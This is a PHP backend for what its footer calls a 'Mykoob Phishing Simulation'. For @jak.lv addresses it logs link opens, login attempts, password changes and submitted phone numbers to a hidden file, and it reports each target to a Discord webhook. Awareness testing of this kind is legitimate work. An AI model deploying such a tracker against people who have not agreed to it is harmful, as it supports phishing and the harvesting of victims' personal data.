<?php
declare(strict_types=1);

const WEBHOOK_URL    = 'https://discord.com/api/webhooks/TAVS_WEBHOOK_SEIT';
const ALLOWED_DOMAIN = '@jak.lv';
const MAX_BODY_BYTES = 4096;
const STORE_DIR      = __DIR__ . '/.logs';
const STORE_FILE     = STORE_DIR . '/users.json';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') { http_response_code(405); exit; }
if ((int) ($_SERVER['CONTENT_LENGTH'] ?? 0) > MAX_BODY_BYTES) { http_response_code(413); exit; }

$raw  = file_get_contents('php://input');
$data = json_decode($raw, true);
if (!is_array($data)) { http_response_code(400); exit; }

$email   = trim((string) ($data['email'] ?? ''));
$action  = trim((string) ($data['action'] ?? 'Event'));
$phone   = isset($data['phone'])   ? substr((string) $data['phone'], 0, 32)   : null;
$country = isset($data['country']) ? substr((string) $data['country'], 0, 4)  : null;

if ($email === '') {
    http_response_code(422);
    exit;
}
if ($email !== 'unknown' && !str_ends_with($email, ALLOWED_DOMAIN)) {
    http_response_code(422);
    exit;
}

// ── Ielādē esošo lietotāju datubāzi ──
@mkdir(STORE_DIR, 0700, true);
$users = is_file(STORE_FILE)
    ? (json_decode((string) file_get_contents(STORE_FILE), true) ?: [])
    : [];

$key = strtolower($email);
if (!isset($users[$key])) {
    $users[$key] = [
        'email'           => $email,
        'message_id'      => null,
        'login_attempts'  => 0,
        'link_opens'      => 0,
        'pwd_changes'     => 0,
        'phone_submitted' => false,
        'phone_number'    => null,
        'country'         => null,
        'first_seen'      => date('c'),
        'last_seen'       => date('c'),
    ];
}

// ── Atjaunina skaitītājus pēc action ──
$u = &$users[$key];
$u['last_seen'] = date('c');

switch (true) {
    case str_contains($action, 'Saites atvēršana'):
        $u['link_opens']++;
        break;
    case str_contains($action, 'Pieslēgšanās mēģinājums'):
        $u['login_attempts']++;
        break;
    case str_contains($action, 'Paroles maiņa apstiprināta'):
        $u['pwd_changes']++;
        break;
    case str_contains($action, 'Telefona numurs apstiprināts'):
        $u['phone_submitted'] = true;
        if ($phone)   $u['phone_number'] = $phone;
        if ($country) $u['country']      = $country;
        break;
}

// ── Būvē embed ──
$fields = [
    ['name' => '📧 E-pasts',            'value' => $u['email'], 'inline' => true],
    ['name' => '🔗 Saites atvērumi',    'value' => (string) $u['link_opens'], 'inline' => true],
    ['name' => '🔐 Pieslēgšanās mēģ.',  'value' => (string) $u['login_attempts'], 'inline' => true],
    ['name' => '🔑 Paroles maiņas',     'value' => (string) $u['pwd_changes'], 'inline' => true],
    ['name' => '📱 Numurs ievadīts',    'value' => $u['phone_submitted'] ? '✅ Jā' : '❌ Nē', 'inline' => true],
];

if ($u['phone_submitted'] && $u['phone_number']) {
    $phoneDisplay = $u['phone_number'];
    if ($u['country']) $phoneDisplay .= " ({$u['country']})";
    $fields[] = ['name' => '📞 Numurs', 'value' => $phoneDisplay, 'inline' => true];
}

$fields[] = ['name' => '🕐 Pēdējais notikums', 'value' => date('Y-m-d H:i:s'), 'inline' => false];
$fields[] = ['name' => '👶 Pirmais kontakts',   'value' => $u['first_seen'],    'inline' => false];

$payload = json_encode([
    'embeds' => [[
        'title'     => '🎯 ' . $u['email'],
        'color'     => $u['phone_submitted'] ? 0xff4444 : 0x00bfff,
        'fields'    => $fields,
        'footer'    => ['text' => 'Mykoob Phishing Simulation'],
        'timestamp' => date('c'),
    ]],
], JSON_UNESCAPED_UNICODE);

// ── Ja ir message_id → PATCH (edit). Ja nav → POST (create) ──
$ch = curl_init();
if (!empty($u['message_id'])) {
    curl_setopt_array($ch, [
        CURLOPT_URL            => WEBHOOK_URL . '/messages/' . $u['message_id'],
        CURLOPT_CUSTOMREQUEST  => 'PATCH',
        CURLOPT_POSTFIELDS     => $payload,
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 3,
        CURLOPT_CONNECTTIMEOUT => 2,
    ]);
    $response = curl_exec($ch);
    $code     = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    // Ja ziņa vairs neeksistē (404) → izveido jaunu
    if ($code === 404) {
        curl_close($ch);
        $ch = curl_init(WEBHOOK_URL . '?wait=true');
        curl_setopt_array($ch, [
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => $payload,
            CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 3,
            CURLOPT_CONNECTTIMEOUT => 2,
        ]);
        $response = curl_exec($ch);
    }
} else {
    curl_setopt_array($ch, [
        CURLOPT_URL            => WEBHOOK_URL . '?wait=true',
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $payload,
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 3,
        CURLOPT_CONNECTTIMEOUT => 2,
    ]);
    $response = curl_exec($ch);

    // Saglabā message_id no atbildes
    $decoded = json_decode((string) $response, true);
    if (is_array($decoded) && isset($decoded['id'])) {
        $u['message_id'] = $decoded['id'];
    }
}
curl_close($ch);

// ── Saglabā atpakaļ ──
unset($u); // izbeidz reference
file_put_contents(
    STORE_FILE,
    json_encode($users, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE),
    LOCK_EX
);

http_response_code(204);
